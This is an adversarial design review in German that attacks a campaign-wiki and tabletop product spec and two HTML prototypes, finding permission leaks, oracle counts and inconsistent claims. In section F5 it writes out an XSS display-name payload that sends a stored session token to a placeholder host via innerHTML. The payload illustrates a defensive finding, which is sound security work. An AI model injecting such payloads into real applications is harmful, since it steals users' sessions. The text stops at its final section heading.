# Angriff auf Kandidat B — „Der Abend" (Runde 3)

Nemesis, die Widersacherin. Gelesen: [`product-B.md`](product-B.md) (1.192 Zeilen),
[`spike-B1.html`](spike-B1.html) (1.754 Zeilen, als Code), [`spike-B2.html`](spike-B2.html)
(2.208 Zeilen, als Code), [`00-intake.md`](../../00-intake.md),
[`RB-11`](../../research/RB-11-steam-vs-browser-verdict.md), RB-01/02/05.

Ich greife die **stärkste** Lesart an. Wo ich nichts brechen konnte, sage ich es namentlich in §4 —
diese Liste ist kürzer als sie sein könnte, aber sie ist echt, und deshalb bedeutet sie etwas.

**Bilanz: 7 fatal · 8 schwer · 7 leicht · 7 namentlich eingeräumt.**
Kein Befund ohne begehbares Szenario. Zwei der sieben Fatalen sind Widersprüche des Dokuments mit
sich selbst; drei sind Rechteverletzungen, die die Artefakte vorführen; zwei treffen den Flex.

---

## 1. FATAL — sieben

### F1 · `Strg+H` ist unter 1180 px eine Liste — auf genau dem Gerät, das die These „die Hälfte" nennt

**Der Befund.** [`spike-B1.html:765–778`](spike-B1.html):

```css
@media (max-width: 1180px) {
  :root { --gutter-open: 0rem; }
  .chip { position: static; width: 100%; margin-bottom: .35rem; display: none; }
  :root[data-hs="on"] .chip { display: grid; }
}
```

Über 1180 px ist der Chip `position:absolute` in einer 13,5-rem-Marginalie: der Satzspiegel bleibt
stehen, ein Streifen erscheint links. Unter 1180 px gibt es keine Marginalie. Jeder der 22 Chips
wird zu einem **vollbreiten, gerahmten Zweizeiler mit Zeitstempel in Monospace, eingeschoben
zwischen die Absätze**. Der Artikel verdoppelt ungefähr seine Höhe. Der Text ist danach 1:1 mit
Ereignismeldungen durchsetzt.

**Das Szenario.** Mittwoch 07:40, Sera im Zug, iPhone. Sie öffnet Haus Vharon und drückt die
Herkunftsschicht. Sie bekommt nicht „dieselbe schöne Seite mit einem Streifen am Rand", sondern eine
Prosa-Ereignis-Prosa-Ereignis-Kette. Dasselbe auf jedem iPad im Hochformat, auf einem iPad Air im
Querformat (genau 1180 px), auf jedem halbierten Browserfenster eines 1920er-Monitors.

**Warum fatal und nicht kosmetisch.** §2.3 nennt den Unterschied selbst tragend: *„`Ctrl+H` ist ein
Toggle über einer schönen Seite, kein Log-View, und der Unterschied ist load-bearing."* §11 macht
daraus eine **Verweigerung**: *„No session-log surface … The moment we ship a log view, the attack
in §1.4 is correct and we have lost."* Und §14-K6: *„die Mittwoch-Telefon-Lesung **ist** die Hälfte
der These."* Die Verweigerung ist absolut formuliert und wird nur oberhalb von 1180 px eingehalten.
Der Kandidat verliert seine eigene, im Voraus benannte Todesursache (§1.4) auf dem Gerät, das er als
halbe These verkauft.

**Was das Verdikt verlangen muss.** Entweder eine echte Schmalform des Flex (Chip als kollabierter
Superscript-Marker, der on demand aufklappt — nicht als Block), oder §11 und §14-K6 werden
umgeschrieben. Nicht beides behalten.

---

### F2 · Eine reine SL-Tatsache erreicht den Client des Spielers per `display:none`

**Der Befund.** [`spike-B1.html:973`](spike-B1.html) trägt im Absatz *„Das Siegel wurde von der Krone
selbst ausgegeben…"*:

```html
<span class="irrtum" data-nur-sl>Irrtum · steht so in Brannts Buch</span>
```

Das Atom hat `data-leser="kaya brannt"` — Brannt bekommt es. Und
[`spike-B1.html:1623–1625`](spike-B1.html):

```js
[].slice.call(atom.querySelectorAll("[data-nur-sl]")).forEach(function (el) {
  el.style.display = LESER[leser].sl ? "" : "none";
});
```

**Das Szenario.** Ansicht auf „Brannt Ohm" stellen. Absatz vier des Abschnitts *Das Aschene Siegel*
markieren, Element untersuchen. Im DOM steht, mit `style="display:none"`, der Satz **„Irrtum · steht
so in Brannts Buch"** — die Information, dass genau diese Passage falsch ist. §3.6 (22:03) und §9.6
verkaufen `belief: false` als Feature: *„sein Buch wird bis Sitzung 19 selbstbewusst falsch sein."*
Das Artefakt liefert die Auflösung mit aus.

**Warum fatal.** Invariante 1: *client-side hiding is never a security boundary.* Der Bruch ist
schlimmer als ein Flüchtigkeitsfehler, weil er **in derselben Funktion** steht, die alle anderen
Absätze mit `removeChild` physisch entfernt ([`spike-B1.html:1554–1570`](spike-B1.html)). Das Team
kennt die Regel, wendet sie auf Absätze an und fällt bei der Marginalie in die Gewohnheit zurück —
und zwar bei der einen Marginalie, die eine reine SL-Tatsache trägt. Der Seitenfuß
([`spike-B1.html:1123–1128`](spike-B1.html)) behauptet zeitgleich das Gegenteil: *„In der Produktion
entfernt der Server nicht freigegebene Passagen … `Sicht`, nicht CSS."* Das Artefakt ist genau an der
Stelle CSS, an der es Sicht behauptet.

**Und die Verallgemeinerung, die teurer ist als der Bug:** Der Kandidat hat eine Disklosure-Klasse
für Felder (`felder.yaml`) und eine für Orakel (`oracles.yaml`) — aber **keine für Marginalien,
Stempel und Randnotizen an einer Passage**, die per Definition Metatext über die Passage sind. §7.2
listet drei neue Leak-Bench-Fixtures; keine davon prüft eine Annotation.

---

### F3 · Default-Allow: eine Abbildung ohne Rechteattribut verrät eine gesperrte Tatsache

**Der Befund.** [`spike-B1.html:1295–1298`](spike-B1.html):

```js
function darf(el, leser) {
  var l = el.getAttribute("data-leser");
  return !l || l.split(/\s+/).indexOf(leser) !== -1;   //  ← kein Attribut = für alle
}
```

Die drei `<figure class="plate">` ([`spike-B1.html:1010–1047`](spike-B1.html)) tragen kein
`data-leser` und sind keine `.atom` — sie werden von `render()` nie angefasst.

**Das Szenario, exakt begehbar.** Ansicht auf „Brannt Ohm". Abschnitt *Der Vharonstein*: Brannt darf
drei der fünf Atome sehen (Zeilen 980, 986, 998), also bleibt der Abschnitt stehen — **und mit ihm
die Tafelgalerie**. Tafel III zeigt den Grundriss der Nische, beschriftet mit dem Wort **„blind"**
und untertitelt *„Der Schacht oben rechts endet blind."* Die Passage, die diese Tatsache trägt
([`spike-B1.html:992–996`](spike-B1.html), *„Der Lichtschacht über der Nische endet blind"*), ist
`data-leser="kaya sera"` — Brannt darf sie nicht wissen. Die Zeichnung sagt es ihm.

**Warum fatal.** Zwei Dinge auf einmal:

1. **Default-Allow in einem Rechtesystem.** Jeder neue Knoten ohne Attribut ist öffentlich. Das ist
   die Voreinstellung, die Invariante 1 verbietet — die Voreinstellung muss `deny` sein, und die
   Abwesenheit einer Regel muss den Build rot machen, nicht die Zeile ausliefern.
2. **Bilder haben in `product-B.md` überhaupt kein Rechtemodell.** §2.1 nennt beiläufig *„eine
   Galerie aus drei Bildern"*; §6 kennt `Passage`, `Revelation`, `Etikett`, `Augenblick`,
   `SzenenEbene` — keine Zeile über die Sichtbarkeit einer Tafel. Eine handgezeichnete Karte, ein
   Wappen, ein Handout ist in einem Kampagnenwiki **der leakfreudigste Inhaltstyp überhaupt**, weil
   er eine Tatsache ohne Satzgrenze transportiert. Der Kandidat hat drei Runden lang die
   Adressierbarkeit unterhalb der Seite erkämpft und dann die Abbildung nicht adressiert.

---

### F4 · Die Zahl **ist** das Orakel — und beide Artefakte drucken sie in dem Satz, der sie bestreitet

**Der Befund.** [`spike-B2.html:1865–1872`](spike-B2.html):

```js
var verdeckt = szene.marken.length - sichtbareMarken(szene).length;
block.appendChild(el("p", { klasse: "linse-notiz", text: verdeckt
  ? verdeckt + " Marke(n) liegen in einer Region, die diese Leserin nicht hält. Sie fehlen hier "
    + "nicht optisch — sie stehen weder im DOM noch im Barrierebaum. Das ist die Stelle, an der "
    + "dieses Produkt leckt, wenn es leckt."
  : "Alle Marken dieser Aufnahme liegen in Regionen, die diese Leserin hält." }));
```

Dazu [`spike-B2.html:2024–2025`](spike-B2.html): `karte("Absätze", "8 / 12")` und
`karte("Marken", "4 / 5")` — Zähler **und Nenner**, in jeder Rolle.

**Das Szenario.** In B2 Rolle auf „Beobachter" stellen, Fußnote [1] öffnen, „Der Augenblick".
Die Linse schreibt: **„3 Marke(n) liegen in einer Region, die diese Leserin nicht hält."** Ein
Zuschauer — im Intake explizit als späterer Nutzertyp geführt — erfährt, dass die Archivnische genau
drei verborgene Wesen enthält. Als Spielerin: „1 Marke(n)" — es steht genau eine Wache im Nordgang.

**Warum fatal.** §9.7 formuliert die Regel selbst, und zwar wörtlich: *„how many tokens were in the
room I couldn't see is information, and a count is an oracle **[C]**."* Das Artefakt bricht sie in
dem Satz, der sich rühmt, sie einzuhalten. Das ist kein Spike-Artefakt-Vorbehalt: die Nachricht ist
eine **Produktoberfläche** (eine Bildunterschrift in der Linse), keine Debug-Anzeige, und sie ist
absichtlich geschrieben.

**Und der teurere Teil: das Gate kann diesen Fehler nicht finden.** §13, `Augenblick-Leck`:

> *„Zwei synthetische Szenen, identisch bis auf **die Position eines Tokens**, vollständige Antworten
> byteweise diffed."*

Ein Differenztest, der genau **eine** Dimension variiert, kann per Konstruktion nichts finden, was in
beiden Fixtures gleich ist: nicht die **Anzahl** der Marken, nicht die **Wandgeometrie** (→ M6),
nicht die Nebelkontur, nicht die Lichtpositionen, nicht die Kardinalität der Initiative-Liste. §9.7
nennt den Augenblick *„die Stelle, an der wir lecken würden"*, benennt Geometrie, Bounding-Boxes und
den Barrierebaum als Kanäle — und antwortet mit einem Gate, das nur den einen Kanal prüft, der schon
benannt war. **Ein Gate, das für die vorgeführte Leckklasse nicht rot werden kann, ist kein Gate.**

---

### F5 · Fremdtext geht durch `innerHTML` — und §10.3 lädt Fremdtext aus Discord ein

**Der Befund, drei Stellen.** [`spike-B1.html:1325`](spike-B1.html) (`chipFuer`, mit
`data-detail`), [`spike-B1.html:1601`](spike-B1.html) (`belegMarkup` mit `b.titel`, `b.figur`,
`b.text`, `b.notiz`, `t.t`, `t.sub`), [`spike-B1.html:1516`](spike-B1.html)
(`augenblick-in.innerHTML = h`, wobei `h` über `svgFuer` **Markennamen** und über die Tafel
`m.name` enthält, Zeilen 1445–1446 und 1503–1507).

Und der Beweis, dass es **Konvention** ist und nicht Versehen —
[`spike-B1.html:1249`](spike-B1.html):

```js
belief: "Diese Passage ist als <b>falsch</b> geprägt (belief: false). …"
```

Ein Fixture-Feld, das absichtlich Markup trägt. Damit ist im Artefakt festgelegt: *Belegtext darf
HTML enthalten.*

**Das Szenario, in aufsteigender Bosheit.**

1. §7.1 Schritt 3: *„Zwei Spieler treten per Link bei, Anzeigename, **kein Konto**."* Der Angreifer
   braucht nur den Link. Anzeigename: `<img src=x onerror="fetch('//x/'+localStorage.token)">`.
   Er landet über `svgFuer` und die Tafel-Liste im `innerHTML` **der Spielleitung** — im Augenblick,
   den Kaya beim Prägen öffnet, mit ihrer Sitzung.
2. §4.6: *„der Wurfkarten-Editor … seine Layout-, Term-Vokabular- und Siegelverhalten sind
   **package-authored**."* §12: Community-Themes über unsere eigene Registry.
3. §10.3(a), die schärfste: *„Ein Wurfkarte exportiert als ein String. In Discord einfügen, und er
   rendert als Fußnotenkarte. In **irgendeine** Chronicle-Kampagne einfügen, und er kommt als
   fremder Beleg an."* Ein aus einem Discord-Kanal kopierter String, in die Kampagne eingefügt, in
   der GM-Sitzung gerendert.

**Warum die Antwort des Dokuments eine Kategorienverwechslung ist.** §12 beantwortet RB-11s
Angriffsziel Nr. 2 mit: *„das Paketformat hat keine Code-Execution-Fluchtluke … ein reisender Beleg
ist ein deklarativer AST"* und §10.3: *„die No-Escape-Hatch-Geschlossenheit des Paketformats deckt
das per Konstruktion ab."* Sie deckt es nicht ab. Die Geschlossenheit begrenzt die **Paketsprache**.
Der Angriff läuft über das **Rendering**: ein deklarativer AST mit einem Stringfeld ist harmlos, bis
das Stringfeld als HTML interpretiert wird — und beide Spikes zeigen, dass das Haus-Rendering von B1
`innerHTML` ist. Invariante 2 („niemals arbitrary code execution") wird nicht in der Paketsprache
verletzt, sondern im Browser der Spielleitung, und das Ergebnis ist dasselbe.

*Fair gehalten:* **B2 macht es richtig.** Sein `el()`-Helfer setzt ausschließlich `textContent`
([`spike-B2.html:1420–1430`](spike-B2.html)); in B2 gibt es keine einzige `innerHTML`-Zuweisung. Der
Befund ist ein B1-Befund — aber B1 ist das Artefakt, das den Kandidaten verkauft, und §16.8 **[C]**
nennt den Sanitiser bereits *„die sicherheitskritischste Funktion des Produkts"*. Der Spike zeigt,
welche Gewohnheit ohne ihn greift.

---

### F6 · §9.4s eigene Rettung ist durch §11 und §13 verboten. Das Dokument behauptet beides

**Der Befund, wörtlich aus dem Kandidaten.**

§9.4: *„die These will ausdrücklich **rückwirkende Zitation**: am Mittwoch merkt die SL, dass der
weggeworfene Wurf vom Dienstag doch zählte, und will ihn prägen. Der Puffer kann also nicht eifrig
gelöscht werden."* Und: eager purge *„bricht das rückwirkende Prägen, das einer der zwei
Mechanismen ist, die Der Abend gegenüber einer SL verzeihlich machen, die um 21:14 zu beschäftigt
war — d. h. es verschlimmert §9.1, die gefährlichste Schwäche der These."*

§6.3 und §13 (`Kein Protokoll`): *„Eine dependency-cruiser-Regel lässt den Build bei **jedem
Response-Serializer** scheitern, der `Sitzungspuffer` **außerhalb des Live-Session-Socket-Handlers**
importiert."* Plus: *„Keine Leseroberfläche rendert ihn. Es gibt keine `oracles.yaml`-Zeile für ein
Sitzungsprotokoll, weil es kein Sitzungsprotokoll gibt."*

**Das Szenario.** Mittwoch, 20:15. Kaya öffnet die App und will den Spurenlese-Wurf von Samstag
22:15 nachträglich prägen. Welchen Bildschirm öffnet sie? Um einen Wurf zu wählen, muss sie eine
Liste von 47 Würfen sehen. Diese Liste ist eine HTTP-Antwort, kein Live-Socket-Frame. Der
`Kein-Protokoll`-Gate macht den Build rot, sobald jemand sie baut. Die Fällung (§4.1) hilft nicht:
sie zeigt *„Zählungen"*, ist *„eine Schlussbilanz"* und ist **„genau einmal pro Sitzung
erreichbar"**.

**Die Zange.**
- *Rückwirkendes Prägen schiffen* ⇒ ein Bildschirm, dessen Vorgabezustand eine Liste dessen ist, was
  passiert ist ⇒ §1.4s Angriff (*„das Exhaust ist ein Log"*) trifft, und §11 sagt: *„haben wir
  verloren."*
- *Rückwirkendes Prägen nicht schiffen* ⇒ die einzige Verzeihlichkeit gegenüber §9.1 fällt weg, und
  §9.1 ist per Selbstauskunft *„die zentrale falsifizierbare Wette"* mit dem Gate, das *„die These
  falsifiziert"*.

**Warum das nicht schon eingeräumt ist.** §9.4 räumt die **Aufbewahrungsfrist** ein („14 Tage sind
eine Policy, keine Property") und sagt ehrlich *„wir haben die Antwort nicht"*. Das ist eine
Privacy-Konzession. Der Befund hier ist ein anderer und härter: **die Konzession kauft nichts**, weil
die Sache, für die die 14 Tage bezahlt werden — die rückwirkende Prägung — durch ein anderes,
gleichzeitig gehaltenes Gate unbaubar ist. Der Kandidat trägt 14 Tage subpoenafähiger Personendaten
für ein Feature, das er sich selbst verbietet.

---

### F7 · Der Flex-Dialog ist unter dem eigenen Musterabend falsch

**Der Befund.** §2.1:

> **Timo:** *„Wie lange hast du daran geschrieben?"* — **Kaya:** *„Gar nicht."*
> … Fünfundzwanzig Absätze. Drei wurden geschrieben. **Zweiundzwanzig sind passiert.**

§3.6, 21:14:38, derselbe Absatz, der im Flex die Hauptrolle spielt:

> *„`Strg+Enter` auf der Wurfkarte. **Versiegelte Saatzeile 3 wird als Passage geprägt**, an Sera
> freigegeben … **2 Sekunden. Kein Tippen.**"*

Eine **versiegelte Saatzeile ist Prosa, die vor Samstag getippt wurde.** §4.1 definiert den Anlass
als *„sechs bis zehn Zeilen, `[[links]]`, einige versiegelt"* — pro Sitzung. Über vier Abende sind
das 24–40 vorgeschriebene Zeilen. Der Absatz, den Timo liest — *„Das Aschene Siegel … ist eine
Fälschung. Die Innenkante des Rings trägt die glatte Riefe eines Gussmodells — ein Verfahren, das es
zur angegebenen Prägezeit nirgends in der Grafschaft gab."* (36 Wörter,
[`spike-B1.html:944–946`](spike-B1.html)) — trägt einen bernsteinfarbenen Chip mit dem Zeitstempel
21:14, obwohl er am 14. März getippt wurde.

**Das Szenario.** Timo fragt nach: *„Und was stand im Anlass?"* Kayas ehrliche Antwort ist: *„Der
Satz. Der Würfel hat entschieden, **wann** er wahr wird und **wer** ihn erfährt."* Das ist ein
anderer, kleinerer und wahrer Satz als *„gar nicht"*.

**Die Gabel, und beide Zinken bluten.**

- **Zinke A — die Sätze waren vorgeschrieben.** Dann unterscheidet der Chip nicht *geschrieben* von
  *passiert*, sondern *geschrieben und nie benutzt* von *geschrieben und von einem Abend wahr
  gemacht*. Das ist ein echter Flex — aber es ist **nicht der, den §2.1 aufführt**, und §1.1s
  Grundsatz *„die Annahme, dass Autorenschaft Tippen ist und Tippen vor Samstag passiert … ist
  falsch"* wird zu einer Umetikettierung: es wird weiter vor Samstag getippt, nur an einem anderen
  Ort und in kürzeren Zeilen.
- **Zinke B — die Sätze wurden am Tisch getippt.** Dann prüfe man den Fixture-Beleg. Das späteste
  bernsteinfarbene Atom in B1 ([`spike-B1.html:1106–1110`](spike-B1.html), **23:19**, nach
  dreieinhalb Stunden Spiel):

  > *„Wer nach dem Torhaus den Namen Vharon in der Aschgasse ausspricht, bekommt keine Antwort — und
  > man merkt, dass es keine Furcht ist, sondern Absprache."*

  24 Wörter, 149 Zeichen, ein Gedankenstrich, eine zweigliedrige Antithese. §7.1 Schritt 1 legt fest,
  dass der Slice-1-Komponist *„ein einzeiliger Inline-Komponist, Klartext, kein Dokumenteneditor"*
  ist. Diesen Satz tippt eine müde SL nicht um 23:19, während vier Leute warten — und wenn doch, ist
  §9.1s Gate (*„≤ 4 Minuten SL-Tippen an Produkt-Chrome"*) für 22 Absätze dieser Länge nicht
  haltbar: 22 × ~150 Zeichen ist allein an Anschlägen mehr als vier Minuten, bevor irgendjemand
  nachdenkt.

**Warum fatal.** Der Flex **ist** der Kandidat — §2.3 sagt es selbst: *„es ist ein einziges
Standbild."* Ein Standbild, dessen Bildunterschrift vom eigenen Musterabend widerlegt wird, überlebt
die erste Demo nicht, in der jemand *„was stand im Anlass?"* fragt. Reparabel: §2.1 umschreiben und
den kleineren, wahren Flex führen. Aber die Runde muss die Reparatur anordnen, nicht das Marketing
sie später entdecken.

---

## 2. SCHWER — acht

### M1 · Das Foto ist ein SL-Screenshot; die Spieler bekommen ein Faltblatt — und es wird schlechter, je besser die SL spielt

In B1 mit dem Leser-Wähler nachzählen: **Kaya 22 Absätze / 5 Belege. Vesper 7 Absätze / 1 Beleg.**
(Vesper steht in `data-leser` nur an den Zeilen 917, 924, 962, 1053, 1072, 1081, 1094.) §7.1
Schritt 10 räumt es ein — *„Vespers hat eine [Passage]"* — verkauft die Mittwochslesung aber im
selben Atemzug als spielerseitige Auszahlung.

Das Retentionsobjekt (§10.1: *„eine SL, die eine Chronik hat, migriert nicht"*) gehört genau **einer**
Person am Tisch. Und die Asymmetrie ist **monoton in der Spielqualität**: je mehr Geheimnisse, je
schärfer die Projektion, desto dünner das Buch jedes Spielers. Vier Rivalen im Korpus gewinnen
Spieler über die Sitzung; dieser Kandidat gewinnt die SL und lässt die Spieler mit sieben Absätzen
zurück. Kein Abschnitt des Dokuments preist Spielerretention.

### M2 · Die gedruckte Begründung ist nicht an die Zahl gepinnt, die sie begründet

§6.1 pinnt `seed`, `ausdruck`, `paket_pin` und speichert `wert` — aber `terme jsonb` ist
`[{quelle, wert, klausel_ref, begruendung_pid?}]`: **eine nackte pid ohne Generation**, während
`Quelle = Passage(pid, **gen**)` die Generation sehr wohl führt. Und §3.3 druckt die Ableitung
*„aus ihrer eigenen Projektion"* — Präsens.

**Szenario.** Sitzung 14: `+2 · du hältst 4 Passagen über Haus Vharon (Sitzung 6, 9, 12, 14)`.
Sitzung 30: Kaya benennt das Etikett `#haus-vharon` in `#haus-aldenfall` um und Sera hält inzwischen
neun Passagen. Fußnote [1] druckt weiterhin `+2` (gepinnt) neben einem Satz, der aus der heutigen
Projektion gerechnet wird. Die Zahl und ihr Grund sind auseinandergelaufen; das Gate
`Der Beleg hält` prüft *„exakte Terme und Summe"* nach einem **Paket-Upgrade** — nicht nach einer
Etikett-Umbenennung, nicht nach neuem Passagenbestand.

Invariante 6 („jede abgeleitete Zahl kann ihre Ableitung zeigen") und §11s *„keine Zahl als Beweis
gedruckt, die nicht rot werden kann"* sind beide betroffen. Fix ist klein: `terme[].begruendung_pid`
→ `(pid, gen)` plus ein gerenderter Textschnappschuss zum Prägezeitpunkt. Aber ohne ihn ist der
Beleg in 2029 kein Beleg.

### M3 · Der Fusionsmechanismus ist **aus** für genau das Segment, das laut RB-11 der Go-to-Market ist

§9.6, eingeräumt: `erfahrungsgrad` ist *„in unserem First-Party-Demopaket an, im leeren Paket aus"*.
RB-11, ratifiziert: *„Discovery läuft über Creators und Systemautoren"*, deshalb *„ist der visuelle
Regelbauer nicht bloß Flagship-Feature, er **ist** der Go-to-Market."*

Die Verbindung, die §9.6 nicht zieht: die Systemautoren, die die Distribution tragen, portieren
**ihr** System. Ihr Port kennt `erfahrungsgrad` nicht. Also erscheint der Mechanismus, der laut §3.4
*„der eine ist, den kein Rivale kopieren kann"*, in **keinem** Community-Paket, das ein Kunde
tatsächlich installiert — nur im Demo. §14-K2s Gegenzug (*„die Regelkarte schafft Autoren, bevor der
Bauer existiert"*) trägt nicht: eine Regelkarte ist per §3.1 `expression_ast = null,
status: informal` — eine **Notiz**. Notizen schaffen keine Autoren, und ein `fire_count` an einer
Notiz ist kein Ranking-Signal für ein Regelpaket.

Dazu die Reihenfolge: 98 Tage Tisch in Slice 1, der Regelbauer (Schema-Formular-Hälfte, 15 Tage)
„launch-blocking-später". Der Kandidat kauft die Existenz eines Spiels mit der Verzögerung seines
Vertriebswegs.

### M4 · Qualitätsverhandlung und Pro-Figur-Nebel werden nie gegeneinander geprüft

§5.4 (RB-05 #10, *„was niemand automatisch macht"*): den schwachen Client automatisch auf *„eine
statische Kartenersatzdarstellung"* fallen lassen. §5.6: Nebel ist eine *„GPU-Explorationstextur"*,
pro Figur, 12 Tage, Risiko **hoch**.

**Szenario.** Timo, Tablet, 3G, integrierte Grafik. §5.4 stuft ihn ab. Eine statische Ersatzkarte
kann keine pro-Figur-Explorationstextur tragen, die sich bei jeder Freigabe ändert. Also entweder
(a) sie ist unvernebelt — dann verletzt ein **Performance-Pfad** Invariante 1, in der Klasse, für die
§9.7 sich sorgt; oder (b) sie ist ein serverseitiger Raster **pro Spielerin pro Freigabezustand** —
und der steht weder in der 12-Tage-Nebelzeile noch in §12s Rechnung von *„< €0,05 pro
Sitzungsstunde, dominiert von Compute und einmaligem Asset-Egress"*, die Fog-Recompute ausdrücklich
als *„clientseitig, geht also nicht in die Serverrechnung"* verbucht.

Das ist der Preis dafür, zwei Dinge zu übernehmen, die einzeln richtig sind (Owlbears Qualitätsschalter,
die eigene Projektion) und die niemand vorher gegeneinander gehalten hat.

### M5 · Wandgeometrie wird nicht projiziert

[`spike-B2.html:1909–1913`](spike-B2.html) zeichnet `szene.waende` als **einen** Pfad, unbedingt, für
jede Rolle; der Nebel ([`spike-B2.html:1897–1906`](spike-B2.html)) ist eine halbtransparente
Schraffur **darüber**.

**Szenario.** Rolle „Spielerin", Beleg [1] → Augenblick. Der Nordgang, den ihre Figur nie betreten
hat, liegt vollständig lesbar unter der Schraffur: Raumform, Ausdehnung, die Tür bei (9,2).
§5.1 sagt korrekt *„Wände verdecken die Aufdeckungsform"* — und sagt nirgends, dass die **Wanddaten
selbst** projiziert werden. §13s Gate kann es nicht sehen (F4). Für einen Kandidaten, dessen
Alleinstellung *„der Nebel ist nicht Nebel — er ist die Projektion"* lautet, ist die durchscheinende
Vollgeometrie der peinlichste mögliche Fund, und er ist eine Zeile Code entfernt.

### M6 · Client-Versionsdrift ist unbepreist — und kostet hier Kanon, nicht einen Reload

§12 liefert zwei getrennte App-Auslieferungen: Browser (Hosted Room, CDN) und Electron-LAN
(eingebettetes Bundle auf der Kiste der SL). RB-11s Angriffsziel *„Browser/Desktop-Parität"* wird in
§12 mit **Feature**-Parität beantwortet (Grenze B8, kein Feature an WebGPU gekoppelt) — nicht mit
**Versions**-Parität. §6.1 pinnt die Paketversion für eine Live-Sitzung; nichts pinnt die
Client-Version.

**Szenario.** Kayas Electron-Host läuft seit drei Monaten unaktualisiert auf v1.4 (es ist ihre
Heimkiste). Timo tritt aus dem Browser bei und bekommt v1.6 vom CDN. In v1.5 hat `Augenblick.marken`
ein Elevationsfeld bekommen. Um 21:47 prägt Kaya, Timos Client wirft beim Deserialisieren, der Mint
schlägt fehl.

**Warum es hier härter zuschlägt als anderswo:** in jedem anderen Produkt ist das ein Reload. Hier
ist der Moment entweder geprägt oder er ist in 14 Tagen **physisch gelöscht** — und die einzige
Rettung, rückwirkendes Prägen, ist durch F6 unbaubar. Ein Wire-Mismatch ist in diesem Produkt
Kanonverlust.

### M7 · §12 behauptet ein Einmalentgelt **und** einen Zähler, in benachbarten Sätzen

> *„Monetarisierung, unverändert **[C]**: einmalige SL-Lizenz (~€30, ≈ €23,50 netto), Spieler immer
> kostenlos, direkt verkauft. **Speicher und Räume tragen den Zähler; Features nie** (Owlbears
> Modell, das der Markt akzeptiert)."*

Owlbears Modell ist ein **Abonnement**. Ein Einmalentgelt und ein Zähler auf Räumen sind zwei
verschiedene Geschäftsmodelle, und der gezählte Raum liegt hier auf dem **Standard-Beitrittspfad**
(§12, Zeile 1: *Hosted Room (default) — Yes*), also auf genau dem Pfad, der die CGNAT-SL überhaupt
bedienbar macht. Entweder kostet der Standardpfad wiederkehrend Geld — dann ist „einmalige Lizenz"
falsch und RB-11s ratifizierte Zeile ist angetastet — oder er kostet es nicht, dann trägt €23,50
netto den Relay auf unbestimmte Zeit. Die Arithmetik selbst hält (siehe C1); die **Modellaussage**
hält nicht. Ein Satz Klärung, aber die Runde muss ihn verlangen, bevor eine Preisseite entsteht.

### M8 · B2 modelliert Rechte als **Rolle**, nicht als Figur — und beweist damit die Universalität am falschen Objekt

[`spike-B2.html:1512–1517`](spike-B2.html): `sichtbar(absatz)` prüft `absatz.sicht[zustand.rolle]`
mit `rolle ∈ sl | spielerin | beobachter`; Marken tragen `r: ["sl","spielerin"]`.

Eine einzige „Spielerin" fasst Sera, Brannt und Vesper zusammen. Damit übt der
**Universalitätsbeweis** den Mechanismus nie aus, der das Produkt zum Produkt macht — *drei
verschiedene Bücher* (§3.6, §7.1 Schritt 10) —, und er kodiert eine Rechte-ACL an einer Rolle, wo
[`02-domain-model.md`](../../02-domain-model.md) die Figur als Subjekt und `Revelation` als Kante
verlangt. B1 macht es pro Figur, aber im Client. **Kein Artefakt der Runde zeigt eine
serverseitige Pro-Figur-Projektion**, und beide Kreuzkritiken sagen es bereits; ich unterschreibe es
und erhöhe: die Rolle-als-Subjekt in B2 ist nicht nur eine Lücke, sondern eine **Formabweichung**,
die man in Produktion mitschleppt, wenn man aus B2 kopiert.

---

## 3. LEICHT — sieben

| # | Befund | Beleg |
|---|---|---|
| **m1** | **`Cmd+H` versteckt auf macOS die Anwendung** auf Fensterserver-Ebene und ist nicht `preventDefault`-bar; [`spike-B1.html:1735`](spike-B1.html) prüft `e.metaKey`. Die Flex-Geste minimiert die App auf dem Mac. Zusätzlich: `Strg` ist in NVDA, JAWS und VoiceOver die universelle *Sprachausgabe-stoppen*-Taste — die Geste schweigt den Screenreader in dem Moment, in dem ihre `aria-live`-Zusammenfassung aktualisiert wird. | B1:1734–1739 |
| **m2** | **B1 hat kein `overflow-wrap` — nirgends.** Der Chip ist eine absolut positionierte Box von ~155 px Textbreite bei 11 px Schrift ⇒ ~26 Zeichen/Zeile. Ein 90-Zeichen-`data-detail` braucht 4 Zeilen ≈ 79 px gegen ~72 px vertikalen Raum über einem Zweizeilen-Atom ⇒ **benachbarte Chips überlappen**. Ein einzelnes 40-Zeichen-Kompositum („Wahrnehmungserschwernisausgleich") bricht gar nicht und läuft nach **links aus dem Artikel heraus**. B2 setzt `overflow-wrap:anywhere` ([`spike-B2.html:441`](spike-B2.html)); B1 nicht — und B1 ist das Verkaufsbild. | B1:426–428, 474–500 |
| **m3** | **Der Prüflauf misst 144 von 1.152 Zuständen und lässt genau die Zugänglichkeitsachsen aus.** [`spike-B2.html:2058–2065`](spike-B2.html) iteriert Welt × Skin × Rolle × Modus × Etikettenlänge und setzt nie `kontrast=hoch`, `bewegung=reduziert`, `art=aus` oder `herkunft=an`. Die Bank, die *„gemessen, nicht behauptet"* sagt, hat den Hochkontrastfall und **die Flex-Schicht selbst** in keiner Kombination gemessen. | B2:2058–2065 |
| **m4** | **Hochkontrast kollabiert `--amber` auf `--hc-ink`** ([`spike-B2.html:120–127`](spike-B2.html)): `--muted`, `--line`, `--amber` und `--danger` werden alle Tinte. Die Chips überleben über Glyphe und Text; `.stempel[data-art="fehlschluss"]` überlebt nur noch über `border-style: solid` gegen `dashed`. Der Kreuzkritiker hat es an einem Fragment gefunden — **es steht unverändert in der Endfassung**. | B2:120–127 |
| **m5** | **`@media print` lässt den Differenzierer fallen.** [`spike-B1.html:828–831`](spike-B1.html) blendet Topbar und Augenblick aus und erzwingt weder `.beleg[data-open="true"]` noch die Chips. Strg+P druckt eine gewöhnliche Enzyklopädie ohne Fußnotenkarten und ohne Herkunft. §10.1 nennt die Chronik *„das Retentionsobjekt"*. | B1:828–831 |
| **m6** | **B1 hat kein `<main>` und keinen Sprunglink** (B2 hat beides, [`spike-B2.html:673`](spike-B2.html)). Der Screenreader-Nutzer landet auf vier Topbar-Bedienelementen vor einem 22-Absatz-Artikel ohne Landmark. | Tag-Zensus B1 |
| **m7** | Das einzige Rasterbild in B2, `harbor-map.png`, ist **3,47 MB** — das 2,9-fache des gesamten §13-Gates *„first paint-to-interactive payload ≤ 1,2 MB"*, für eine einzelne Tafel. | B2 `renderTafeln`; `design/spikes/assets/harbor-night/` |

---

## 4. Was ich nicht brechen konnte — namentlich

Diese Liste ist nicht gepolstert. Ich habe an jedem Punkt ernsthaft gezogen.

